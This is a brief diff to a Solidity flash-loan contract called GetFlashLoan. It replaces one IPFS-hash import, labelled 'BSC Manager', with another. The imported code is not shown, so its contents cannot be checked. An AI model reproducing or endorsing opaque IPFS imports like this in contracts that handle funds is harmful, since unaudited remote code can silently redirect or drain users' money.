@@ -10,7 +10,7 @@ import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contra
 import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 
 // Import BSC Manager
-import "ipfs://QmRb1GBsTqt5xkcYGARYgA1UewzssXerRoRgieQntok44N";
+import "ipfs://QmQh2ExsXAgMBjKEoUMnSWvqVtUcKFKi9qNEGiPytTuGBk";
 
 contract GetFlashLoan {
    string public tokenName;
